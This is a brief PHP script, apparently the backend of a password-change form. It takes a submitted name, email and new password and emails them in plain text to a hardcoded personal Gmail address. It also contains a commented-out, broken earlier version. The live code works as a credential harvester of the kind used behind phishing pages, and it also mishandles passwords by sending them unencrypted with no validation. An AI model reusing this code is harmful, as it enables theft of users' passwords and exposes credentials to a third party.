<?php
/*
if (isset($_POST['send'])){
if (!empty($_POST['name']) && !empty($_POST['email'])){
    $name = $_POST['name'];
    $email = $_POST['email'];
    $contenido = "nombre: " .$name . "correo: " .$email;
    $header = "From: noreply@example.com";
    $header.= "Reply-To: noreply@example.com" . "\r\n";
    $header.= "X-Mailer: PHP/". phpversion();
    $email= @mail ($name,$email,$header);
    if ($email) {
        echo "<h4> Mail enviado exitosamente! </h4>";
    }
}
}
*/

    $destino = "nmortarinom@gmail.com";
    $name = $_POST['name'];
    $email = $_POST['email'];
    $newPassword = $_POST['newpassword'];
    $contenido = "Nombre: " .$name. "\nContraseña: " .$newPassword. "\nCorreo: " . $email;
    mail($destino, "nueva Contrasenia: ", $contenido);
    header("Reply-To: noreply@example.com");
    
    if ($email) {
        echo "<h4> Mail enviado exitosamente! </h4>";
    }
?>